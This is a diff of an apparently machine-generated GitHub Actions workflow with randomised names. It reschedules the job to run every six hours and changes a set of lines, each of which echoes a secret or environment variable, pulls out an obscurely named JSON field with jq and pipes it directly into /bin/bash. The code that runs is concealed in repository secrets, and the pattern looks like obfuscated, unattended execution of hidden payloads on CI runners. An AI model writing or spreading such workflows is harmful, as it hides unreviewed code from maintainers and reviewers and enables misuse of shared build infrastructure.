@@ -2,8 +2,8 @@ name: xiongtianping4187
 on:
   workflow_dispatch:
   schedule:
-    - cron: '30 5/6 * * *'
-jobs:  # 25630
+    - cron: '24 2/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -11,19 +11,12 @@ jobs:  # 25630
       - uses: actions/checkout@v4
       - name: xiongtianping4187
         env:
-          pqkf72105: ${{ secrets.pqkf72105 }}
+          q87: ${{ secrets.q87 }}
         run: |
-          echo $pqkf72105 | jq -r .a3 | /bin/bash
-          echo $zokra8036 | jq -r .zfnu27 | /bin/bash
-          echo $zvj6685 | jq -r .nfril485 | /bin/bash
-          echo $t60 | jq -r .vviea884 | /bin/bash
-          echo $i3 | jq -r .q5565 | /bin/bash
-          echo $c04 | jq -r .br5768 | /bin/bash
-          echo $wcxk6942 | jq -r .ejj60 | /bin/bash
-          echo $klad7 | jq -r .s96 | /bin/bash
-          echo $tlv401 | jq -r .a341 | /bin/bash
-          echo $mb9 | jq -r .dvar5 | /bin/bash
-          echo $w156 | jq -r .fxbuz562 | /bin/bash
-          echo $zdln263 | jq -r .s332 | /bin/bash
-          echo $luof30 | jq -r .hb17 | /bin/bash
+          echo $q87 | jq -r .zwzk199 | /bin/bash
+          echo $wetm8204 | jq -r .f52536 | /bin/bash
+          echo $t24433 | jq -r .iw0 | /bin/bash
+          echo $mvm93 | jq -r .tirq9848 | /bin/bash
+          echo $ih09646 | jq -r .uvrz6060 | /bin/bash
+          echo $fbwdx89 | jq -r .oq0146 | /bin/bash
 
